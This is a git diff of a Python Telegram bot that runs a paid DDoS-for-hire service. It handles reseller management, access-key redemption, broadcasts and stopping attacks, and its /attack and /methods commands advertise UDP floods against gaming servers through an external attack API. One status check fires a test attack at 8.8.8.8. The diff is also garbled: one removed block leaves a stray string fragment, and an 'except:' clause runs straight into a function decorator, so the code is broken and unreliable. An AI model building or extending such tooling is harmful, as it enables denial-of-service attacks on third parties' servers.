@@ -528,204 +528,8 @@ def remove_user(msg):
     except:
         pass
 
-@bot.message_handler(commands=['addreseller'])
-def add_reseller(msg):
-    uid = str(msg.chat.id)
-    
-    if uid not in ADMIN_ID:
-        bot.reply_to(msg, "❌ Owner only!")
-        return
-    
-    args = msg.text.split()
-    if len(args) != 2:
-        bot.reply_to(msg, "Usage: /addreseller USER_ID\nExample: /addreseller 123456789")
-        return
-    
-    new_reseller = args[1]
-    
-    if new_reseller in ADMIN_ID:
-        bot.reply_to(msg, "❌ Cannot add owner as reseller!")
-        return
-    
-    if new_reseller in resellers:
-        bot.reply_to(msg, f"❌ User {new_reseller} is already a reseller!")
-        return
-    
-    resellers.append(new_reseller)
-    users_data["resellers"] = resellers
-    save_users(users_data)
-    
-    if new_reseller not in users:
-        users.append(new_reseller)
-        users_data["users"] = users
-        save_users(users_data)
-    
-    bot.reply_to(msg, f"""✅ RESELLER ADDED!
 
-👤 Reseller: {new_reseller}
-🔑 Can now generate keys using /genkey""")
-    
-    try:
-        bot.send_message(new_reseller, "✅ You have been added as RESELLER!\nYou can now generate keys using /genkey")
-    except:
-        pass
-
-@bot.message_handler(commands=['removereseller'])
-def remove_reseller(msg):
-    uid = str(msg.chat.id)
-    
-    if uid not in ADMIN_ID:
-        bot.reply_to(msg, "❌ Owner only!")
-        return
-    
-    args = msg.text.split()
-    if len(args) != 2:
-        bot.reply_to(msg, "Usage: /removereseller USER_ID\nExample: /removereseller 123456789")
-        return
-    
-    target_reseller = args[1]
-    
-    if target_reseller in ADMIN_ID:
-        bot.reply_to(msg, "❌ Cannot remove owner!")
-        return
-    
-    if target_reseller not in resellers:
-        bot.reply_to(msg, f"❌ User {target_reseller} is not a reseller!")
-        return
-    
-    resellers.remove(target_reseller)
-    users_data["resellers"] = resellers
-    save_users(users_data)
-    
-    bot.reply_to(msg, f"""✅ RESELLER REMOVED!
-
-👤 User: {target_reseller}
-❌ Can no longer generate keys""")
-    
-    try:
-        bot.send_message(target_reseller, "⚠️ Your reseller privileges have been removed!")
-    except:
-        pass
-
-@bot.message_handler(commands=['redeem'])
-def redeem(msg):
-    uid = str(msg.chat.id)
-    
-    args = msg.text.split()
-    if len(args) != 2:
-        bot.reply_to(msg, "Usage: /redeem KEY")
-        return
-    
-    key_raw = args[1]
-    key = clean_key(key_raw)
-    
-    if key not in keys_data:
-        bot.reply_to(msg, "❌ Invalid key!")
-        return
-    
-    key_info = keys_data[key]
-    
-    if key_info.get("used", False):
-        bot.reply_to(msg, "❌ Key already used!")
-        return
-    
-    if time.time() > key_info["expires_at"]:
-        bot.reply_to(msg, "❌ Key expired!")
-        del keys_data[key]
-        save_keys(keys_data)
-        return
-    
-    if uid not in users:
-        users.append(uid)
-    
-    users_data["users"] = users
-    save_users(users_data)
-    
-    keys_data[key]["used"] = True
-    keys_data[key]["used_at"] = time.time()
-    keys_data[key]["used_by"] = uid
-    save_keys(keys_data)
-    
-    expiry_str = datetime.fromtimestamp(key_info['expires_at']).strftime('%Y-%m-%d %H:%M:%S')
-    
-    bot.reply_to(msg, f"""✅ ACCESS GRANTED!
-
-🎉 User {uid} activated!
-⏰ Duration: {key_info['duration_value']} Day(s)
-📅 Expires: {expiry_str}
-⚡ Concurrent Attacks: 2""")
-
-@bot.message_handler(commands=['mykeys'])
-def mykeys(msg):
-    uid = str(msg.chat.id)
-    
-    if uid not in ADMIN_ID and uid not in resellers:
-        bot.reply_to(msg, "❌ Unauthorized!")
-        return
-    
-    my_generated_keys = []
-    for key, info in keys_data.items():
-        if info.get("generated_by") == uid and not info.get("used", False):
-            expires = datetime.fromtimestamp(info["expires_at"]).strftime('%Y-%m-%d')
-            my_generated_keys.append(f"🔑 `{key}`\n   Duration: {info['duration_value']} days\n   Expires: {expires}")
-    
-    if my_generated_keys:
-        bot.reply_to(msg, f"📋 YOUR GENERATED KEYS:\n\n{chr(10).join(my_generated_keys)}")
-    else:
-        bot.reply_to(msg, "📋 No keys generated yet!")
-
-@bot.message_handler(commands=['broadcast'])
-def broadcast(msg):
-    uid = str(msg.chat.id)
-    
-    if uid not in ADMIN_ID:
-        bot.reply_to(msg, "❌ Owner only!")
-        return
-    
-    args = msg.text.split(maxsplit=1)
-    if len(args) != 2:
-        bot.reply_to(msg, "Usage: /broadcast MESSAGE")
-        return
-    
-    message = args[1]
-    
-    success_count = 0
-    fail_count = 0
-    
-    for user in users:
-        try:
-            bot.send_message(user, f"📢 BROADCAST\n\n{message}")
-            success_count += 1
-        except:
-            fail_count += 1
-    
-    bot.reply_to(msg, f"✅ BROADCAST SENT!\n✅ {success_count} users\n❌ {fail_count} failed")
-
-@bot.message_handler(commands=['stopattack'])
-def stop_attack(msg):
-    uid = str(msg.chat.id)
-    
-    if uid not in ADMIN_ID:
-        bot.reply_to(msg, "❌ Owner only!")
-        return
-    
-    args = msg.text.split()
-    if len(args) != 2:
-        bot.reply_to(msg, "Usage: /stopattack IP:PORT")
-        return
-    
-    target = args[1]
-    
-    stopped = False
-    for attack_id, info in list(active_attacks.items()):
-        if info["target_key"] == target:
-            del active_attacks[attack_id]
-            if info["user"] in user_attacks:
-                if attack_id in user_attacks[info["user"]]:
-                    user_attacks[info["user"]].remove(attack_id)
-            stopped = True
-            
-            bot.reply_to(msg, f"✅ ATTACK STOPPED!\nTarget: {target}\nAttacker: {info['user']}")
+    !\nTarget: {target}\nAttacker: {info['user']}")
             
             try:
                 bot.send_message(info['user'], f"⚠️ Your attack on {target} was stopped!")
@@ -843,6 +647,271 @@ def api_status(msg):
         test_response = requests.get(f"{API_URL}?api_key={API_KEY}&target=8.8.8.8&port=80&time=5&concurrent=1", timeout=5)
         status = f"✅ API: {'Online' if test_response.status_code == 200 else 'Offline'}\nActive Attacks: {len(active_attacks)}"
         bot.reply_to(msg, status)
+    except:
+@bot.message_handler(commands=['addreseller'])
+def add_reseller(msg):
+    uid = str(msg.chat.id)
+    
+    if uid not in ADMIN_ID:
+        bot.reply_to(msg, "❌ Owner only!")
+        return
+    
+    args = msg.text.split()
+    if len(args) != 2:
+        bot.reply_to(msg, "Usage: /addreseller USER_ID\nExample: /addreseller 123456789")
+        return
+    
+    new_reseller = args[1]
+    
+    if new_reseller in ADMIN_ID:
+        bot.reply_to(msg, "❌ Cannot add owner as reseller!")
+        return
+    
+    if new_reseller in resellers:
+        bot.reply_to(msg, "❌ User is already a reseller!")
+        return
+    
+    resellers.append(new_reseller)
+    users_data["resellers"] = resellers
+    save_users(users_data)
+    
+    if new_reseller not in users:
+        users.append(new_reseller)
+        users_data["users"] = users
+        save_users(users_data)
+    
+    bot.reply_to(msg, "✅ RESELLER ADDED!\n\n👤 Reseller: " + new_reseller + "\n🔑 Can now generate keys using /genkey")
+    
+    try:
+        bot.send_message(new_reseller, "✅ You have been added as RESELLER!\nYou can now generate keys using /genkey")
+    except:
+        pass
+
+@bot.message_handler(commands=['removereseller'])
+def remove_reseller(msg):
+    uid = str(msg.chat.id)
+    
+    if uid not in ADMIN_ID:
+        bot.reply_to(msg, "❌ Owner only!")
+        return
+    
+    args = msg.text.split()
+    if len(args) != 2:
+        bot.reply_to(msg, "Usage: /removereseller USER_ID\nExample: /removereseller 123456789")
+        return
+    
+    target_reseller = args[1]
+    
+    if target_reseller in ADMIN_ID:
+        bot.reply_to(msg, "❌ Cannot remove owner!")
+        return
+    
+    if target_reseller not in resellers:
+        bot.reply_to(msg, "❌ User is not a reseller!")
+        return
+    
+    resellers.remove(target_reseller)
+    users_data["resellers"] = resellers
+    save_users(users_data)
+    
+    bot.reply_to(msg, "✅ RESELLER REMOVED!\n\n👤 User: " + target_reseller + "\n❌ Can no longer generate keys")
+    
+    try:
+        bot.send_message(target_reseller, "⚠️ Your reseller privileges have been removed!")
+    except:
+        pass
+
+@bot.message_handler(commands=['redeem'])
+def redeem(msg):
+    uid = str(msg.chat.id)
+    
+    args = msg.text.split()
+    if len(args) != 2:
+        bot.reply_to(msg, "Usage: /redeem KEY")
+        return
+    
+    key_raw = args[1]
+    key = clean_key(key_raw)
+    
+    if key not in keys_data:
+        bot.reply_to(msg, "❌ Invalid key!")
+        return
+    
+    key_info = keys_data[key]
+    
+    if key_info.get("used", False):
+        bot.reply_to(msg, "❌ Key already used!")
+        return
+    
+    if time.time() > key_info["expires_at"]:
+        bot.reply_to(msg, "❌ Key expired!")
+        del keys_data[key]
+        save_keys(keys_data)
+        return
+    
+    if uid not in users:
+        users.append(uid)
+    
+    users_data["users"] = users
+    save_users(users_data)
+    
+    keys_data[key]["used"] = True
+    keys_data[key]["used_at"] = time.time()
+    keys_data[key]["used_by"] = uid
+    save_keys(keys_data)
+    
+    expiry_str = datetime.fromtimestamp(key_info['expires_at']).strftime('%Y-%m-%d %H:%M:%S')
+    
+    bot.reply_to(msg, "✅ ACCESS GRANTED!\n\n🎉 User " + uid + " activated!\n⏰ Duration: " + str(key_info['duration_value']) + " Day(s)\n📅 Expires: " + expiry_str + "\n⚡ Concurrent Attacks: 2")
+
+@bot.message_handler(commands=['mykeys'])
+def mykeys(msg):
+    uid = str(msg.chat.id)
+    
+    if uid not in ADMIN_ID and uid not in resellers:
+        bot.reply_to(msg, "❌ Unauthorized!")
+        return
+    
+    my_generated_keys = []
+    for key, info in keys_data.items():
+        if info.get("generated_by") == uid and not info.get("used", False):
+            expires = datetime.fromtimestamp(info["expires_at"]).strftime('%Y-%m-%d')
+            my_generated_keys.append("🔑 `" + key + "`\n   Duration: " + str(info['duration_value']) + " days\n   Expires: " + expires)
+    
+    if my_generated_keys:
+        bot.reply_to(msg, "📋 YOUR GENERATED KEYS:\n\n" + "\n\n".join(my_generated_keys))
+    else:
+        bot.reply_to(msg, "📋 No keys generated yet!")
+
+@bot.message_handler(commands=['broadcast'])
+def broadcast(msg):
+    uid = str(msg.chat.id)
+    
+    if uid not in ADMIN_ID:
+        bot.reply_to(msg, "❌ Owner only!")
+        return
+    
+    args = msg.text.split(maxsplit=1)
+    if len(args) != 2:
+        bot.reply_to(msg, "Usage: /broadcast MESSAGE")
+        return
+    
+    message = args[1]
+    
+    success_count = 0
+    fail_count = 0
+    
+    for user in users:
+        try:
+            bot.send_message(user, "📢 BROADCAST\n\n" + message)
+            success_count += 1
+        except:
+            fail_count += 1
+    
+    bot.reply_to(msg, "✅ BROADCAST SENT!\n✅ " + str(success_count) + " users\n❌ " + str(fail_count) + " failed")
+
+@bot.message_handler(commands=['stopattack'])
+def stop_attack(msg):
+    uid = str(msg.chat.id)
+    
+    if uid not in ADMIN_ID:
+        bot.reply_to(msg, "❌ Owner only!")
+        return
+    
+    args = msg.text.split()
+    if len(args) != 2:
+        bot.reply_to(msg, "Usage: /stopattack IP:PORT")
+        return
+    
+    target = args[1]
+    
+    stopped = False
+    for attack_id, info in list(active_attacks.items()):
+        if info["target_key"] == target:
+            del active_attacks[attack_id]
+            if info["user"] in user_attacks:
+                if attack_id in user_attacks[info["user"]]:
+                    user_attacks[info["user"]].remove(attack_id)
+            stopped = True
+            
+            bot.reply_to(msg, "✅ ATTACK STOPPED!\nTarget: " + target + "\nAttacker: " + info['user'])
+            
+            try:
+                bot.send_message(info['user'], "⚠️ Your attack on " + target + " was stopped!")
+            except:
+                pass
+            break
+    
+    if not stopped:
+        bot.reply_to(msg, "❌ No attack found on " + target)
+
+@bot.message_handler(commands=['methods'])
+def methods(msg):
+    uid = str(msg.chat.id)
+    
+    if uid not in users and uid not in ADMIN_ID and uid not in resellers:
+        bot.reply_to(msg, "❌ Unauthorized!")
+        return
+    
+    bot.reply_to(msg, "⚡ UDP AUTO ATTACK\n\n💡 Best for gaming (BGMI, Minecraft)\n🎯 Recommended ports: 443, 8080, 14000\n\nUSAGE:\n/attack IP PORT TIME\n\nExample: /attack 1.1.1.1 443 60")
+
+@bot.message_handler(commands=['stats'])
+def stats(msg):
+    uid = str(msg.chat.id)
+    
+    if uid not in users and uid not in ADMIN_ID and uid not in resellers:
+        bot.reply_to(msg, "❌ Unauthorized!")
+        return
+    
+    user_active = check_user_active_attacks(uid)
+    has_active = check_user_expiry(uid)
+    
+    status_text = "Active" if has_active else "Expired"
+    cooldown_text = "Yes" if uid in cooldown else "No"
+    
+    bot.reply_to(msg, "📊 YOUR STATS\n\n👤 ID: " + uid + "\n✅ Status: " + status_text + "\n💪 Active: " + str(user_active) + "/" + str(MAX_CONCURRENT) + "\n⏰ Cooldown: " + cooldown_text)
+
+@bot.message_handler(commands=['help'])
+def help_cmd(msg):
+    uid = str(msg.chat.id)
+    
+    if uid in ADMIN_ID:
+        bot.reply_to(msg, "🔥 OWNER HELP\n\n/attack IP PORT TIME - Launch attack\n/status - Check slots\n/methods - Attack methods\n/stats - Your stats\n/genkey 1 - Generate 1 day key\n/removekey KEY - Remove key\n/add USER_ID - Add user\n/remove USER_ID - Remove user\n/addreseller USER_ID - Add reseller\n/removereseller USER_ID - Remove reseller\n/broadcast MSG - Broadcast message\n/stopattack IP:PORT - Stop attack\n/allusers - List all users\n/api_status - API status")
+    elif uid in resellers:
+        bot.reply_to(msg, "🔥 RESELLER HELP\n\n/attack IP PORT TIME - Launch attack\n/status - Check slots\n/methods - Attack methods\n/stats - Your stats\n/genkey 1 - Generate 1 day key\n/mykeys - Your generated keys")
+    elif uid in users:
+        bot.reply_to(msg, "🔥 USER HELP\n\n/attack IP PORT TIME - Launch attack\n/status - Check slots\n/methods - Attack methods\n/stats - Your stats\n/redeem KEY - Activate key")
+    else:
+        bot.reply_to(msg, "❌ Unauthorized! Use /redeem KEY")
+
+@bot.message_handler(commands=['allusers'])
+def all_users(msg):
+    if str(msg.chat.id) not in ADMIN_ID:
+        bot.reply_to(msg, "❌ Owner only!")
+        return
+    
+    user_list = []
+    for u in users:
+        if u in ADMIN_ID:
+            role = "👑 OWNER"
+        elif u in resellers:
+            role = "💎 RESELLER"
+        else:
+            role = "👤 USER"
+        user_list.append(role + ": " + u)
+    
+    bot.reply_to(msg, "📋 ALL USERS:\n" + "\n".join(user_list) + "\n\nTotal: " + str(len(users)) + "\nResellers: " + str(len(resellers)))
+
+@bot.message_handler(commands=['api_status'])
+def api_status(msg):
+    if str(msg.chat.id) not in ADMIN_ID:
+        bot.reply_to(msg, "❌ Owner only!")
+        return
+    
+    try:
+        test_response = requests.get(f"{API_URL}?api_key={API_KEY}&target=8.8.8.8&port=80&time=5&concurrent=1", timeout=5)
+        api_status_text = "Online" if test_response.status_code == 200 else "Offline"
+        bot.reply_to(msg, "✅ API: " + api_status_text + "\nActive Attacks: " + str(len(active_attacks)))
     except:
         bot.reply_to(msg, "❌ API OFFLINE")
 
